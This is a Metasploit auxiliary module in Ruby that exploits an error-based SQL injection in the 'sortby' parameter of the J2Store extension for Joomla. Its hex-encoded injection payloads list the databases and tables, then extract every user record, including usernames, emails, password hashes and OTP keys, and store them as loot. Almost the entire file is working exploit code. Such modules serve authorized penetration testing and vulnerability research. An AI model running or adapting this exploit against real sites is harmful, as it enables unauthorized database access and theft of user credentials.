##
# This module requires Metasploit: http://metasploit.com/download
# Current source: https://github.com/rapid7/metasploit-framework
##

require 'msf/core'

class MetasploitModule < Msf::Auxiliary

  include Msf::Auxiliary::Report
  include Msf::Exploit::Remote::HttpClient

  def initialize(info = {})
    super(update_info(info,
      'Name'           => 'J2Store for Joomla! User Enumeration via SQL Injection',
      'Description'    => %q{

      This module will attempt to exploit an error-based SQL injection in version
      3.1.6 and likely prior of J2Store in order to enumerate users and password
      hashes.
      },
      'References'     =>
        [
        ],
      'Author'         =>
        [
          'bperry'
        ],
      'License'        => 'VolatileMinds',
      'DisclosureDate' => "Jul 7 2015"
    ))

    register_options(
      [
        OptString.new("TARGETURI", [true, 'The relative URI of the Joomla installation', '/']),
      ], self.class)
  end

  def run
    front_marker = Rex::Text.rand_text_alpha(5)
    back_marker = Rex::Text.rand_text_alpha(5)

    get_db_count = "(SELECT 1658 FROM(SELECT COUNT(*),CONCAT(0x#{front_marker.unpack("H*")[0]},(SELECT IFNULL(CAST(COUNT(schema_name) AS CHAR),0x20) FROM INFORMATION_SCHEMA.SCHEMATA),0x#{back_marker.unpack("H*")[0]},FLOOR(RAND(0)*2))x FROM INFORMATION_SCHEMA.CHARACTER_SETS GROUP BY x)a)"

    res = send_injected_request(get_db_count)

    db_count = $1 if res && res.body =~ /#{front_marker}(.*)#{back_marker}/
    db_count = db_count.to_i if db_count

    unless db_count
      fail_with(Failure::Unknown, "The server did not respond in an expected way")
    end

    dbs = []
    users = []
    0.upto(db_count-1) do |i|
      get_db = "(SELECT 2610 FROM(SELECT COUNT(*),CONCAT(0x#{front_marker.unpack("H*")[0]},(SELECT MID((IFNULL(CAST(schema_name AS CHAR),0x20)),1,50) FROM INFORMATION_SCHEMA.SCHEMATA LIMIT #{i},1),0x#{back_marker.unpack("H*")[0]},FLOOR(RAND(0)*2))x FROM INFORMATION_SCHEMA.CHARACTER_SETS GROUP BY x)a)"

      res = send_injected_request(get_db)

      dbs << $1 if res && res.body =~ /#{front_marker}(.*)#{back_marker}/
    end

    dbs.delete('mysql')
    dbs.delete('performance_schema')
    dbs.delete('information_schema')

    print_good("Found #{dbs.length} databases: #{dbs}")
    dbs.each do |db|
      print_good("Enumerating tables in database: " + db)
      get_table_count = "(SELECT 5167 FROM(SELECT COUNT(*),CONCAT(0x#{front_marker.unpack("H*")[0]},(SELECT IFNULL(CAST(COUNT(table_name) AS CHAR),0x20) FROM INFORMATION_SCHEMA.TABLES WHERE table_schema IN (0x#{db.unpack("H*")[0]})),0x#{back_marker.unpack("H*")[0]},FLOOR(RAND(0)*2))x FROM INFORMATION_SCHEMA.CHARACTER_SETS GROUP BY x)a)"
      res = send_injected_request(get_table_count)

      table_count = $1 if res && res.body =~ /#{front_marker}(.*)#{back_marker}/
      table_count = table_count.to_i if table_count

      unless table_count
        fail_with(Failure::Unknown, "Server did not respond in an expected way")
      end

      print_good("Database #{db} has #{table_count} tables.")
      tables = []
      0.upto(table_count-1) do |i|
        get_table = "(SELECT 3526 FROM(SELECT COUNT(*),CONCAT(0x#{front_marker.unpack("H*")[0]},(SELECT MID((IFNULL(CAST(table_name AS CHAR),0x20)),1,50) FROM INFORMATION_SCHEMA.TABLES WHERE table_schema IN (0x#{db.unpack("H*")[0]}) LIMIT #{i},1),0x#{back_marker.unpack("H*")[0]},FLOOR(RAND(0)*2))x FROM INFORMATION_SCHEMA.CHARACTER_SETS GROUP BY x)a)"
        res = send_injected_request(get_table)
        table = $1 if res && res.body =~ /#{front_marker}(.*)#{back_marker}/
        tables << table if table && table =~ /users$/
      end

      print_good("Found #{tables.length} user tables: #{tables}")
      tables.each do |table|
        cols = ["activation", "block", "email", "id", "lastResetTime", "lastvisitDate", "name", "otep", "otpKey", "params", "password", "registerDate", "requireReset", "resetCount", "sendEmail", "username"]
        get_row_count = "(SELECT 2934 FROM(SELECT COUNT(*),CONCAT(0x#{front_marker.unpack("H*")[0]},(SELECT IFNULL(CAST(COUNT(*) AS CHAR),0x20) FROM #{db}.#{table}),0x#{back_marker.unpack("H*")[0]},FLOOR(RAND(0)*2))x FROM INFORMATION_SCHEMA.CHARACTER_SETS GROUP BY x)a)"
        res = send_injected_request(get_row_count)

        row_count = $1 if res && res.body =~ /#{front_marker}(.*)#{back_marker}/
        row_count = row_count.to_i if row_count

        unless row_count
          fail_with(Failure::Unknown, "Server did not respond in an expected way")
        end

        0.upto(row_count-1) do |i|
          user = {}
          cols.each do |col|
            k = 1
            val = ''
            data = nil
            loop do
              get_val = "(SELECT 8183 FROM(SELECT COUNT(*),CONCAT(0x#{front_marker.unpack("H*")[0]},(SELECT MID((IFNULL(CAST(#{col} AS CHAR),0x20)),#{k},50) FROM #{db}.#{table} ORDER BY id LIMIT #{i},1),0x#{back_marker.unpack("H*")[0]},FLOOR(RAND(0)*2))x FROM INFORMATION_SCHEMA.CHARACTER_SETS GROUP BY x)a)"
              res = send_injected_request(get_val)
              data = $1 if res && res.body =~ /#{front_marker}(.*)#{back_marker}/
              val << data.to_s if data
              k += 50
              break if data == '' || data == nil
            end
            user[col] = val
            vprint_good("Found value #{val} for column #{col} at row #{i} for table #{table}")
          end
          users << user
        end
      end
    end

    path = store_loot("joomla.users", "text/plain", rhost, users.to_json, 'joomla.users')
    print_good("Users stored in JSON file #{path}")
  end

  def send_injected_request(injection)
    return send_request_cgi({
      'uri' => normalize_uri(target_uri.path, 'index.php'),
      'method' => 'POST',
      'vars_post' => {
        'search' => '',
        'sortby' => injection,
        'option' => 'com_j2store',
        'view' => 'products',
        'task' => 'browse',
        'Itemid' => 115
      }
    })
  end
end

